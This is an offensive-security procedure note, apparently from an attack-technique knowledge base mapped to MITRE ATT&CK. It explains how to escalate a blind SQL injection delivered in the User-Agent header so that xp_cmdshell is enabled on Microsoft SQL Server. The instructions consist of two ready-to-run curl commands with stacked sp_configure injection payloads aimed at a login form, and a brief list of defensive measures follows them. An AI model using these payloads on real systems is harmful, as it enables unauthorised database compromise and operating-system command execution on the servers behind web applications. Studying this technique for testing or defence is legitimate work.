---
tags:
  - sqli
  - privilege-escalation
  - xp_cmdshell
type: procedure
tools: []
tactics:
  - '[[Privilege Escalation]]'
commands:
  - '[[commands/enable-xp_cmdshell-payload]]'
verified: false
platforms:
  - Windows
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploitation for Privilege Escalation]]'
updated_at: '2025-12-14T03:46:20.460Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: fb221c2c-9501-484b-9da5-0b331cbb3fda
validated: true
mitre_tactics:
  - '[[Privilege Escalation]]'
mitre_techniques:
  - '[[Exploitation for Privilege Escalation]]'
---
# Enable xp_cmdshell via Blind SQL Injection

## Summary

This procedure escalates a blind SQL injection to enable the xp_cmdshell extended stored procedure on Microsoft SQL Server, allowing subsequent OS command execution on the Windows backend.

## Description

Targeting a vulnerable login form, use chained SQL statements via the User-Agent header to reconfigure server options blindly. Assumes confirmed SQLi from prior step. Outcomes: xp_cmdshell activated for RCE, often requiring sysadmin privileges.

## Requirements

1. Confirmed blind SQLi in User-Agent
2. MSSQL server with sufficient privileges for sp_configure
3. Time-based or boolean blind techniques for verification

## Defense

Defensive measures and detection strategies:

- Disable xp_cmdshell by default and monitor sp_configure calls
- Use least privilege for DB accounts processing web inputs
- Log and alert on extended procedure enablement attempts

## Objectives

1. Reconfigure advanced options to allow xp_cmdshell
2. Enable the procedure for command execution
3. Verify via test invocation

## Instructions

### Step 1: Enable Advanced Options

**Context**: First, show and set advanced options using sp_configure.

**Command** ([[commands/enable-xp_cmdshell-payload]]):
```bash
curl -X POST https://target.example.com/login -H "User-Agent: '; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;--" -d "username=test&password=test"
```

> No output; confirm by lack of errors in subsequent steps.

### Step 2: Enable xp_cmdshell

**Context**: Set and reconfigure xp_cmdshell to 1.

**Command** ([[commands/enable-xp_cmdshell-payload]]):
```bash
curl -X POST https://target.example.com/login -H "User-Agent: '; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--" -d "username=test&password=test"
```

> Success indicated by ability to run xp_cmdshell in next procedure.

## MITRE ATT&CK Mapping

### Tactics

- [[Privilege Escalation]]

### Techniques

- [[Exploitation for Privilege Escalation]]

### Sub-Techniques


## Commands Used

- [[commands/enable-xp_cmdshell-payload]]

## Tools Used


## Tags

- [[privilege-escalation]]
- [[xp_cmdshell]]
